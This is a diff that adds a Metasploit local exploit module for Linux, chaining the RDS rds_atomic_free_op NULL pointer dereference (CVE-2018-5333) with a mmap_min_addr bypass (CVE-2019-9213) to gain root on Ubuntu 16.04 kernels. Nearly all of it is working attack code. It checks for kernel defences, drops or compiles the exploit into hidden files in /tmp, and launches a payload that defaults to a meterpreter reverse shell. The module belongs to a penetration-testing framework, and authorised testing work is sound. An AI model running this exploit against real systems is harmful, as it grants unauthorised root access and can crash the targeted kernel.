@@ -1,0 +1,166 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GoodRanking
+
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::Compile
+  include Msf::Post::Linux::System
+  include Msf::Post::Linux::Kernel
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Reliable Datagram Sockets (RDS) rds_atomic_free_op NULL pointer dereference Privilege Escalation',
+      'Description'    => %q{
+        This module attempts to gain root privileges on Linux systems by abusing
+        a NULL pointer dereference in the `rds_atomic_free_op` function in the
+        Reliable Datagram Sockets (RDS) kernel module (rds.ko).
+
+        Successful exploitation requires the RDS kernel module to be loaded.
+        If the RDS module is not blacklisted (default); then it will be loaded
+        automatically.
+
+        This exploit supports 64-bit Ubuntu Linux systems, including distributions
+        based on Ubuntu, such as Linux Mint and Zorin OS.
+
+        Target offsets are available for:
+
+        Ubuntu 16.04 kernels 4.4.0 <= 4.4.0-116-generic; and
+        Ubuntu 16.04 kernels 4.8.0 <= 4.8.0-54-generic.
+
+        This exploit does not bypass SMAP. Bypasses for SMEP and KASLR are included.
+        Failed exploitation may crash the kernel.
+
+        This module has been tested successfully on various 4.4 and 4.8 kernels.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Mohamed Ghannam', # Discovery of RDS rds_atomic_free_op null pointer dereference and DoS PoC (2018-5333)
+          'Jann Horn',       # Discovery of MAP_GROWSDOWN mmap_min_addr bypass technique and PoC code (CVE-2019-9213)
+          'wbowling',        # C exploit combining 2018-5333 and CVE-2019-9213 targeting Ubuntu 16.04 kernel 4.4.0-116-generic
+          'bcoles',          # Metasploit module and updated C exploit
+          'nstarke'          # Additional kernel offsets
+        ],
+      'DisclosureDate' => '2018-11-01',
+      'Platform'       => [ 'linux' ],
+      'Arch'           => [ ARCH_X64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'        => [[ 'Auto', {} ]],
+      'Privileged'     => true,
+      'References'     =>
+        [
+          [ 'CVE', '2018-5333' ],
+          [ 'CVE', '2019-9213' ],
+          [ 'BID', '102510' ],
+          [ 'URL', 'https://gist.github.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4' ],
+          [ 'URL', 'https://github.com/0x36/CVE-pocs/blob/master/CVE-2018-5333-rds-nullderef.c' ],
+          [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2' ],
+          [ 'URL', 'https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-5333.html' ],
+          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7d11f77f84b27cef452cee332f4e469503084737' ],
+          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=15133f6e67d8d646d0744336b4daa3135452cb0d' ],
+          [ 'URL', 'https://github.com/bcoles/kernel-exploits/blob/master/CVE-2018-5333/cve-2018-5333.c' ]
+        ],
+      'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
+      'Notes'          =>
+        {
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_OS_DOWN ],
+        },
+      'DefaultTarget'  => 0))
+    register_advanced_options [
+      OptBool.new('ForceExploit',  [ false, 'Override check result', false ]),
+      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir'].to_s
+  end
+
+  def check
+    arch = kernel_hardware
+    unless arch.include? 'x86_64'
+      return CheckCode::Safe("System architecture #{arch} is not supported")
+    end
+    vprint_good "System architecture #{arch} is supported"
+
+    offsets = strip_comments(exploit_data('CVE-2018-5333', 'cve-2018-5333.c')).scan(/kernels\[\] = \{(.+?)\};/m).flatten.first
+    kernels = offsets.scan(/"(.+?)"/).flatten
+
+    version = "#{kernel_release} #{kernel_version.split(' ').first}"
+    unless kernels.include? version
+      return CheckCode::Safe("Linux kernel #{version} is not vulnerable")
+    end
+    vprint_good "Linux kernel #{version} is vulnerable"
+
+    if smap_enabled?
+      return CheckCode::Safe('SMAP is enabled')
+    end
+    vprint_good 'SMAP is not enabled'
+
+    if lkrg_installed?
+      return CheckCode::Safe('LKRG is installed')
+    end
+    vprint_good 'LKRG is not installed'
+
+    if grsec_installed?
+      return CheckCode::Safe('grsecurity is in use')
+    end
+    vprint_good 'grsecurity is not in use'
+
+    unless kernel_modules.include? 'rds'
+      vprint_warning 'rds.ko kernel module is not loaded, but may be autoloaded during exploitation'
+      return CheckCode::Detected('rds.ko kernel module is not loaded, but may be autoloaded during exploitation')
+    end
+    vprint_good 'rds.ko kernel module is loaded'
+
+    CheckCode::Appears
+  end
+
+  def exploit
+    unless [CheckCode::Detected, CheckCode::Appears].include? check
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    if is_root?
+      unless datastore['ForceExploit']
+        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
+      end
+    end
+
+    unless writable? base_dir
+      fail_with Failure::BadConfig, "#{base_dir} is not writable"
+    end
+
+    exploit_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
+
+    if live_compile?
+      vprint_status 'Live compiling exploit on system...'
+      upload_and_compile exploit_path, exploit_data('CVE-2018-5333', 'cve-2018-5333.c')
+    else
+      vprint_status 'Dropping pre-compiled exploit on system...'
+      upload_and_chmodx exploit_path, exploit_data('CVE-2018-5333', 'cve-2018-5333.out')
+    end
+    register_file_for_cleanup exploit_path
+
+    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
+    upload_and_chmodx payload_path, generate_payload_exe
+    register_file_for_cleanup payload_path
+
+    # mincore KASLR bypass is usually fast, but can sometimes take up to 30 seconds to complete
+    timeout = 30
+    print_status "Launching exploit (timeout: #{timeout})..."
+    output = cmd_exec("echo '#{payload_path} & exit' | #{exploit_path}", nil, timeout)
+    output.each_line { |line| vprint_status line.chomp }
+  end
+end
